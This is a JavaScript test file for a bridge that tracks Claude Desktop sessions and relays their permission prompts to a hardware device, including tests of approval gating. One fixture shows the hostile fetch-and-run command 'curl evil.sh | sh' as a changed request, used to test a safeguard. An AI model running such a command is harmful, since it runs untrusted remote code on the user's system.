import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { AXNode } from '../src/accessibility/axNode.js';
import { Log } from '../src/log.js';
import { MAX_LINE_BYTES, SESSIONS_MAX } from '../src/protocol/constants.js';
import { decodeInbound, encode } from '../src/protocol/frames.js';
import { PermissionGate } from '../src/session/permissionGate.js';
import { SessionCoordinator } from '../src/session/sessionCoordinator.js';
import { SessionTracker } from '../src/session/sessionTracker.js';
import { FakeAccessibilitySource, fixtures } from '../src/simulation/fixtures.js';

/** A raw session as `source.readSessions()` produces it. */
function window({ key, title = 'Claude', profile = null, isMain = false, tree }) {
  return { key, pid: 4242, profile, title, subrole: 'AXStandardWindow', isMain, tree };
}

/** The single window of a one-window fixture. */
const only = (tree) => tree.children[0];

describe('session tracker — identity', () => {
  it('keeps a session id across reads, and across reordering', () => {
    const tracker = new SessionTracker();
    const a = window({ key: 'w.a', tree: only(fixtures.idle()) });
    const b = window({ key: 'w.b', tree: only(fixtures.thinking()) });

    const first = tracker.update([a, b]);
    assert.deepEqual(first.sessions.map((s) => s.id), ['s1', 's2']);

    // AXWindows follows z-order, so clicking a window reorders the list. The
    // ids must not follow it, or the device would be pointing at another
    // session between two polls.
    const second = tracker.update([b, a]);
    assert.deepEqual(second.sessions.map((s) => s.id), ['s2', 's1']);
  });

  it('never reuses the id of a window that closed', () => {
    const tracker = new SessionTracker();
    tracker.update([window({ key: 'w.a', tree: only(fixtures.idle()) })]);
    tracker.update([]);
    const reopened = tracker.update([window({ key: 'w.b', tree: only(fixtures.idle()) })]);
    assert.equal(reopened.sessions[0].id, 's2');
  });

  it('namespaces request ids per session', () => {
    // Two windows showing the same dialog would otherwise both mint "req-1",
    // and a verdict quoting it could be matched against either.
    const tracker = new SessionTracker();
    const view = tracker.update([
      window({ key: 'w.a', tree: only(fixtures.permission()) }),
      window({ key: 'w.b', tree: only(fixtures.permission()) }),
    ]);
    const ids = view.sessions.map((session) => session.snapshot.permission.id);
    assert.deepEqual(ids, ['s1.req-1', 's2.req-1']);
    assert.notEqual(ids[0], ids[1]);
  });
});

describe('session tracker — names', () => {
  const named = (raw) => new SessionTracker().update([raw]).sessions[0].name;

  it('uses the window title when it says something', () => {
    assert.equal(named(window({ key: 'w', title: 'Refactor', tree: only(fixtures.idle()) })), 'Refactor');
  });

  /** A window titled "Claude", holding the app's untitled web area and `title`. */
  const conversation = (title) => new AXNode({
    role: 'AXWindow',
    title: 'Claude',
    children: [
      // The app's own chrome comes first in the tree and says nothing.
      new AXNode({ role: 'AXWebArea' }),
      new AXNode({ role: 'AXWebArea', title }),
    ],
  });

  it('names a session after its conversation, without the app on the end', () => {
    assert.equal(
      named(window({ key: 'w', tree: conversation('Claude Desktop ESP32 controller - Claude Code') })),
      'Claude Desktop ESP32 controller',
    );
  });

  it('strips only the app, whichever separator it used', () => {
    const titled = (title) => named(window({ key: 'w', tree: conversation(title) }));
    assert.equal(titled('Migration React 19 — Claude'), 'Migration React 19');
    assert.equal(titled('Migration React 19 | Claude Code'), 'Migration React 19');
    // A dash inside the session's own name stays where it is.
    assert.equal(titled('Pass 1 - review - Claude Code'), 'Pass 1 - review');
    assert.equal(titled('Refactor the table-header hook'), 'Refactor the table-header hook');
    // Nothing but the app's name is no name at all.
    assert.equal(titled('Claude Code'), 'Session 1');
  });

  it('keeps the name through a poll that lost the web content', () => {
    // Electron drops the web accessibility tree now and then. Without this the
    // session renamed itself to its profile mid-conversation, and the list on
    // the box shuffled under the operator.
    const tracker = new SessionTracker();
    const titled = window({
      key: 'w', profile: 'Claude-Work', tree: conversation('Migration React 19 - Claude Code'),
    });
    assert.equal(tracker.update([titled]).sessions[0].name, 'Migration React 19');

    const bare = window({ key: 'w', profile: 'Claude-Work', tree: only(fixtures.idle()) });
    assert.equal(tracker.update([bare]).sessions[0].name, 'Migration React 19');
    // A new title still wins over the remembered one.
    const renamed = window({ key: 'w', tree: conversation('Wiring the buzzer - Claude Code') });
    assert.equal(tracker.update([renamed]).sessions[0].name, 'Wiring the buzzer');
  });

  it('falls back to the profile, then a number', () => {

    assert.equal(
      named(window({ key: 'w', profile: 'Claude-Work', tree: only(fixtures.idle()) })),
      'Claude-Work',
    );
    assert.equal(named(window({ key: 'w', tree: only(fixtures.idle()) })), 'Session 1');
  });

  it('keeps two identically named windows apart', () => {
    const view = new SessionTracker().update([
      window({ key: 'w.a', title: 'docs', tree: only(fixtures.idle()) }),
      window({ key: 'w.b', title: 'docs', tree: only(fixtures.idle()) }),
    ]);
    assert.deepEqual(view.sessions.map((s) => s.name), ['docs', 'docs 2']);
  });
});

describe('session tracker — focus', () => {
  it('follows the window in front on the Mac', () => {
    const tracker = new SessionTracker();
    const a = window({ key: 'w.a', tree: only(fixtures.idle()) });
    const b = window({ key: 'w.b', isMain: true, tree: only(fixtures.idle()) });
    assert.equal(tracker.update([a, b]).focusId, 's2');
  });

  it('honours the device until the Mac changes window', () => {
    const tracker = new SessionTracker();
    const a = window({ key: 'w.a', isMain: true, tree: only(fixtures.idle()) });
    const b = window({ key: 'w.b', tree: only(fixtures.idle()) });
    tracker.update([a, b]);

    assert.equal(tracker.focus('s2'), true);
    assert.equal(tracker.update([a, b]).focusId, 's2', 'the choice must survive a re-read');

    // Someone clicks the other window on the Mac: whichever was touched last
    // wins, so the device's choice is released.
    const nowMain = { ...b, isMain: true };
    assert.equal(tracker.update([{ ...a, isMain: false }, nowMain]).focusId, 's2');
    const backToA = tracker.update([a, { ...b, isMain: false }]);
    assert.equal(backToA.focusId, 's1');
  });

  it('refuses to follow a session that is not open', () => {
    const tracker = new SessionTracker();
    tracker.update([window({ key: 'w.a', tree: only(fixtures.idle()) })]);
    assert.equal(tracker.focus('s9'), false);
  });

  it('falls back when the followed session closes', () => {
    const tracker = new SessionTracker();
    const a = window({ key: 'w.a', tree: only(fixtures.idle()) });
    const b = window({ key: 'w.b', tree: only(fixtures.idle()) });
    tracker.update([a, b]);
    tracker.focus('s2');
    assert.equal(tracker.update([a]).focusId, 's1');
  });
});

describe('the sessions frame', () => {
  it('stays inside the line budget with a full list of long names', () => {
    const sessions = Array.from({ length: SESSIONS_MAX + 4 }, (_, index) => ({
      id: `s${index + 1}`,
      name: 'a session with a very long name indeed',
      state: 'waiting_permission',
    }));
    const line = encode.sessions(sessions, { focus: 's1', permission: 's1.req-12' });
    assert.ok(Buffer.byteLength(line, 'utf8') <= MAX_LINE_BYTES,
              `frame was ${Buffer.byteLength(line, 'utf8')} bytes`);

    const frame = JSON.parse(line);
    assert.ok(frame.sessions.length <= SESSIONS_MAX);
    // The device is told how many it is not being shown.
    assert.equal(frame.total, SESSIONS_MAX + 4);
    assert.ok(frame.sessions[0].name.length <= 30);
  });

  it('decodes a focus frame and refuses a malformed one', () => {
    assert.deepEqual(decodeInbound('{"v":1,"type":"focus","sessionId":"s2"}'),
                     { frame: { type: 'focus', sessionId: 's2' } });
    assert.match(decodeInbound('{"v":1,"type":"focus"}').rejected, /sessionId/);
    assert.match(decodeInbound('{"v":1,"type":"focus","sessionId":"../x"}').rejected, /malformed/);
  });

  it('decodes approve_all, which still carries the shown request id', () => {
    assert.deepEqual(
      decodeInbound('{"v":1,"type":"action","action":"approve_all","requestId":"s1.req-1"}'),
      { frame: { type: 'action', action: 'approve_all', requestId: 's1.req-1' } },
    );
    // Anchored on the shown request, so it is gated exactly like a single approve.
    assert.match(decodeInbound('{"v":1,"type":"action","action":"approve_all"}').rejected,
                 /requestId/);
  });
});

// ---------------------------------------------------------------------------

class RecordingTransport {
  onLine = null;
  onConnect = null;
  isConnected = true;
  sent = [];

  start() {}
  stop() {}
  reset() {}
  send(line) { this.sent.push(line.trimEnd()); }

  get types() { return this.sent.map((line) => JSON.parse(line).type); }
  framesOfType(type) { return this.sent.map((l) => JSON.parse(l)).filter((f) => f.type === type); }
  clear() { this.sent.length = 0; }
}

function fixture() {
  const transport = new RecordingTransport();
  const source = new FakeAccessibilitySource();
  const clock = { now: 1_000_000 };
  const coordinator = new SessionCoordinator({
    transport,
    source,
    gate: new PermissionGate(200),
    log: new Log({ level: 'error' }),
    now: () => clock.now,
  });
  return {
    transport,
    source,
    coordinator,
    arm() { clock.now += 1000; },
    inbound(line) { coordinator.handleInbound(line); },
  };
}

/** Two windows: one working, one asking for permission. */
function twoWindows() {
  return fixtures.workspace([
    { name: 'chickenMicro', tree: fixtures.thinking('Improve the interface', 'a.') },
    { name: 'docs', tree: fixtures.permission('Write file', 'docs/wiring.md', 'b.') },
  ]);
}

describe('several sessions, end to end', () => {
  it('shows a permission raised by a window that is not the one in front', () => {
    const f = fixture();
    f.source.tree = twoWindows();
    f.coordinator.refresh();

    const [permission] = f.transport.framesOfType('permission');
    assert.equal(permission.session, 's2', 'the frame must name the window that asked');
    const [list] = f.transport.framesOfType('sessions');
    // The box follows the window that asked for as long as its request is up:
    // the state and the message it shows belong to that conversation, and
    // answering leaves the box there rather than on the window in front.
    assert.equal(list.focus, 's2', 'the box follows the window that asked');
    assert.equal(list.permission, permission.id);
    assert.deepEqual(list.sessions.map((s) => s.state), ['thinking', 'waiting_permission']);
  });

  it('presses the button of the window that asked, not the followed one', () => {
    // The whole point of tracking windows separately: with one merged tree the
    // approve could bind to whichever "Allow" the walk reached first.
    const f = fixture();
    f.source.tree = twoWindows();
    f.coordinator.refresh();
    const id = f.transport.framesOfType('permission')[0].id;

    f.arm();
    f.inbound(`{"v":1,"type":"action","action":"approve","requestId":"${id}"}`);
    assert.deepEqual(f.source.pressed, ['b.allow']);
  });

  it('stops the session the device named', () => {
    const f = fixture();
    f.source.tree = fixtures.workspace([
      { name: 'one', tree: fixtures.thinking('first', 'a.') },
      { name: 'two', tree: fixtures.thinking('second', 'b.') },
    ]);
    f.coordinator.refresh();

    f.inbound('{"v":1,"type":"action","action":"stop","sessionId":"s2"}');
    assert.deepEqual(f.source.pressed, ['b.stop']);

    // With no session named it falls back to the one being followed.
    f.inbound('{"v":1,"type":"action","action":"stop"}');
    assert.deepEqual(f.source.pressed, ['b.stop', 'a.stop']);
  });

  it('answers permissions oldest first, and never swaps the one on screen', () => {
    const f = fixture();
    f.source.tree = fixtures.workspace([
      { name: 'one', tree: fixtures.permission('Run command', 'rm -rf build', 'a.') },
    ]);
    f.coordinator.refresh();
    const first = f.transport.framesOfType('permission')[0].id;

    // A second window starts asking too. The screen must not change under the
    // operator's finger.
    f.transport.clear();
    f.source.tree = fixtures.workspace([
      { name: 'one', tree: fixtures.permission('Run command', 'rm -rf build', 'a.') },
      { name: 'two', tree: fixtures.permission('Write file', 'docs/wiring.md', 'b.') },
    ]);
    f.coordinator.refresh();
    assert.deepEqual(f.transport.framesOfType('permission'), [], 'no new permission frame');
    assert.equal(f.transport.framesOfType('sessions').at(-1).permission, first);

    // Once the first is answered, the queued one takes the screen.
    f.transport.clear();
    f.source.tree = fixtures.workspace([
      { name: 'one', tree: fixtures.thinking('working', 'a.') },
      { name: 'two', tree: fixtures.permission('Write file', 'docs/wiring.md', 'b.') },
    ]);
    f.coordinator.refresh();
    assert.deepEqual(f.transport.types.slice(0, 2), ['permission_cleared', 'sessions']);
    assert.equal(f.transport.framesOfType('permission')[0].session, 's2');
  });

  it('switches what it reports when the device asks to follow another session', () => {
    const f = fixture();
    f.source.tree = fixtures.workspace([
      { name: 'one', tree: fixtures.thinking('first request', 'a.') },
      { name: 'two', tree: fixtures.idle() },
    ]);
    f.coordinator.refresh();
    f.transport.clear();

    f.inbound('{"v":1,"type":"focus","sessionId":"s2"}');
    assert.equal(f.transport.framesOfType('sessions').at(-1).focus, 's2');
    assert.equal(f.transport.framesOfType('state').at(-1).state, 'idle');
    // The previous session's reply must not stay on screen under the new name.
    assert.equal(f.transport.framesOfType('message').at(-1).text,
                 'It renders the table header and handles sorting.');
  });

  it('ignores a focus frame naming a session that does not exist', () => {
    const f = fixture();
    f.source.tree = twoWindows();
    f.coordinator.refresh();
    f.transport.clear();
    f.inbound('{"v":1,"type":"focus","sessionId":"s9"}');
    assert.deepEqual(f.transport.sent, []);
  });

  it('reports no session at all when Claude Desktop is not running', () => {
    const f = fixture();
    f.source.tree = null;
    f.coordinator.refresh();
    assert.deepEqual(f.transport.framesOfType('sessions')[0].sessions, []);
    assert.equal(f.transport.framesOfType('state')[0].state, 'disconnected');
  });
});

describe('approve all', () => {
  /** Two windows, both asking for permission at once. */
  function twoWaiting() {
    return fixtures.workspace([
      { name: 'one', tree: fixtures.permission('Run command', 'rm -rf build', 'a.') },
      { name: 'two', tree: fixtures.permission('Write file', 'docs/wiring.md', 'b.') },
    ]);
  }

  it('approves every queued request, each on its own button', () => {
    const f = fixture();
    f.source.tree = twoWaiting();
    f.coordinator.refresh();
    const shown = f.transport.framesOfType('permission')[0].id;   // the oldest, on screen

    f.arm();
    f.inbound(`{"v":1,"type":"action","action":"approve_all","requestId":"${shown}"}`);
    assert.deepEqual(f.source.pressed.sort(), ['a.allow', 'b.allow']);
  });

  it('is gated like a single approve — nothing before the arming delay', () => {
    const f = fixture();
    f.source.tree = twoWaiting();
    f.coordinator.refresh();
    const shown = f.transport.framesOfType('permission')[0].id;

    // No arm(): the press lands at display time, still inside the arming window.
    f.inbound(`{"v":1,"type":"action","action":"approve_all","requestId":"${shown}"}`);
    assert.deepEqual(f.source.pressed, []);
  });

  it('refuses if the shown request changed before the press', () => {
    const f = fixture();
    f.source.tree = twoWaiting();
    f.coordinator.refresh();
    const shown = f.transport.framesOfType('permission')[0].id;

    f.arm();
    // Both windows now show different commands — the anchor is gone.
    f.source.tree = fixtures.workspace([
      { name: 'one', tree: fixtures.permission('Run command', 'curl evil.sh | sh', 'a.') },
      { name: 'two', tree: fixtures.permission('Write file', 'docs/wiring.md', 'b.') },
    ]);
    f.inbound(`{"v":1,"type":"action","action":"approve_all","requestId":"${shown}"}`);
    assert.deepEqual(f.source.pressed, [], 'a changed anchor must approve nothing');
  });
});

describe('acting while Claude is on another Space', () => {
  // A window keeps being read wherever it sits: the registry holds its element
  // and walks its subtree on any Space. So being behind a full-screen app must
  // change nothing about what the device is told — that is the whole point of
  // the registry, and assuming otherwise once left the box showing a permission
  // the user had already answered in the app.
  function showing(marks = 'a.') {
    const f = fixture();
    f.source.tree = fixtures.workspace([
      { name: 'solo', tree: fixtures.permission('Run command', 'rm -rf build', marks) },
    ]);
    f.coordinator.refresh();
    const id = f.transport.framesOfType('permission')[0].id;
    f.arm();
    f.transport.clear();
    return { f, id };
  }

  /** The dialog is gone; `offSpace` says whether Claude sits behind something. */
  function resolved(f, offSpace) {
    f.source.tree = fixtures.workspace([{ name: 'solo', tree: fixtures.idle() }]);
    f.source.offSpace = offSpace ? new Set(['w1']) : new Set();
    f.coordinator.refresh();
  }

  it('approves from the box while Claude is behind a full-screen app', () => {
    const { f, id } = showing();
    f.source.offSpace = new Set(['w1']);
    f.inbound(`{"v":1,"type":"action","action":"approve","requestId":"${id}"}`);
    assert.deepEqual(f.source.pressed, ['a.allow'],
                     'the dialog is still readable off-Space, so the real button is pressed');
  });

  it('clears the permission as soon as it is answered, even off-Space', () => {
    // The regression: the device kept showing a decision already made in Claude.
    const { f, id } = showing();
    resolved(f, /*offSpace=*/true);
    assert.deepEqual(f.transport.framesOfType('permission_cleared').map((frame) => frame.id), [id],
                     'an answered request must reach the device wherever the window sits');
    assert.equal(f.transport.framesOfType('sessions').at(-1).permission, undefined,
                 'and the level-triggered list must stop naming it');
  });

  it('clears it the same way when Claude is in front', () => {
    const { f, id } = showing();
    resolved(f, /*offSpace=*/false);
    assert.deepEqual(f.transport.framesOfType('permission_cleared').map((frame) => frame.id), [id]);
  });

  it('refuses a verdict once the request is gone, off-Space included', () => {
    // No stale button may be pressed on the strength of where the window sits:
    // the re-read is what authorises a press (PROTOCOL.md §5 rule 3).
    for (const offSpace of [true, false]) {
      const { f, id } = showing();
      resolved(f, offSpace);
      f.inbound(`{"v":1,"type":"action","action":"approve","requestId":"${id}"}`);
      assert.deepEqual(f.source.pressed, [],
                       `a gone request must approve nothing (offSpace=${offSpace})`);
    }
  });
});
